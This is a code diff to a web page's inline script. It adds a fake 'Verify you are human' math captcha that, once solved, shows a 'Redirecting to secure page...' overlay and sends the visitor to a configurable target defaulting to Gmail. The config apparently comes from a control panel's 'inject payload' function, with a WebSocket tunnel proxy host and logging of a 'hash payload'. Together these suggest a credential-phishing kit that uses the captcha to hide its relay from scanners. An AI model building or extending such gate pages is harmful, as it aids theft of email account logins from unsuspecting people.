@@ -782,23 +782,115 @@
     <script>
         // ================================================================
         // DYNAMIC CONFIGURATION - Read from injected config
-        // ================================================================
+    // ================================================================
+    
+    // These will be set by the panel's _embed_inject_payload() function
+    window.__wsUrl = window.__wsUrl || 'wss://proxy-websocket.onrender.com';
+    window.__tunnelUrl = window.__tunnelUrl || 'https://proxy-websocket.onrender.com';
+    window.__config = window.__config || {};
+    
+    // ================================================================
+    // CAPTCHA ENGINE - UPDATED WITH DIRECT REDIRECT
+    // ================================================================
+    
+    function renderCaptcha() {
+        const container = document.getElementById('captcha-placeholder');
+        if (!container) return;
         
-        // These will be set by the panel's _embed_inject_payload() function
-        // If not set, fallback to default values
-        window.__wsUrl = window.__wsUrl || 'wss://proxy-websocket.onrender.com';
-        window.__tunnelUrl = window.__tunnelUrl || 'https://proxy-websocket.onrender.com';
-        window.__config = window.__config || {};
+        // Use custom captcha HTML if provided, else use math captcha
+        if (window.__config?.captchaHtml) {
+            container.innerHTML = window.__config.captchaHtml;
+            if (typeof window.initCustomCaptcha === 'function') {
+                window.initCustomCaptcha();
+            }
+            return;
+        }
         
-        // For backward compatibility with existing code that expects these
-        // to be set in the DOM, set them from window values
-        document.addEventListener('DOMContentLoaded', function() {
-            var wsInput = document.getElementById('websocket_url');
-            var tunnelInput = document.getElementById('tunnel_url');
-            if (wsInput) wsInput.value = window.__wsUrl;
-            if (tunnelInput) tunnelInput.value = window.__tunnelUrl;
-        });
-
+        // Default: Math captcha
+        const num1 = Math.floor(Math.random() * 10) + 1;
+        const num2 = Math.floor(Math.random() * 10) + 1;
+        const answer = num1 + num2;
+        
+        container.innerHTML = `
+            <div style="text-align: center; padding: 10px;">
+                <p style="font-size: 18px; font-weight: bold; margin: 10px 0;">${window.__config?.captchaQuestion || 'Verify you are human'}</p>
+                <p style="font-size: 28px; margin: 15px 0; font-weight: bold;">${num1} + ${num2} = ?</p>
+                <input type="number" id="captcha-input" style="padding: 12px; font-size: 18px; width: 120px; text-align: center; border: 2px solid #dadce0; border-radius: 4px;" autofocus />
+                <br><br>
+                <button onclick="checkCaptcha()" style="padding: 12px 40px; font-size: 16px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500;">
+                    ${window.__config?.captchaButtonText || 'Verify'}
+                </button>
+            </div>
+        `;
+        
+        window._captchaAnswer = answer;
+        
+        setTimeout(function() {
+            const input = document.getElementById('captcha-input');
+            if (input) input.focus();
+        }, 100);
+    }
+    
+    function checkCaptcha() {
+        const input = document.getElementById('captcha-input');
+        const status = document.getElementById('captcha-status');
+        
+        if (!input || !status) return;
+        
+        const userAnswer = parseInt(input.value);
+        const correctAnswer = window._captchaAnswer;
+        
+        if (userAnswer === correctAnswer) {
+            status.className = 'success';
+            status.style.background = '#d4edda';
+            status.style.color = '#155724';
+            status.textContent = '✅ ' + (window.__config?.captchaSuccessText || 'Verification successful! Redirecting...');
+            
+            // ============================================================
+            // CRITICAL: Direct redirect to target URL
+            // ============================================================
+            const targetUrl = window.__config?.targetUrl || 'https://mail.google.com';
+            
+            // Show loading overlay while redirecting
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;justify-content:center;align-items:center;color:white;font-family:Arial,sans-serif;font-size:18px;';
+            overlay.innerHTML = '<div style="text-align:center;"><div style="width:40px;height:40px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div><p>Redirecting to secure page...</p><style>@keyframes spin{to{transform:rotate(360deg)}}</style></div>';
+            document.body.appendChild(overlay);
+            
+            // Redirect after delay
+            setTimeout(function() {
+                window.location.href = targetUrl;
+            }, 1500);
+            
+        } else {
+            status.className = 'error';
+            status.style.background = '#f8d7da';
+            status.style.color = '#721c24';
+            status.textContent = '❌ ' + (window.__config?.captchaErrorText || 'Incorrect. Please try again.');
+            setTimeout(function() {
+                renderCaptcha();
+                status.className = '';
+                status.style.background = '';
+                status.style.color = '';
+                status.textContent = '';
+            }, 1500);
+        }
+    }
+    
+    // ================================================================
+    // INITIALIZATION
+    // ================================================================
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        renderCaptcha();
+        
+        if (window.__ei) {
+            console.log('🔑 Hash payload detected:', window.__ei);
+        }
+        
+        console.log('📦 Worker Configuration:', window.__config);
+        console.log('🎯 Target URL:', window.__config?.targetUrl);
+    });
         // ================================================================
         // GLOBALS
         // ================================================================
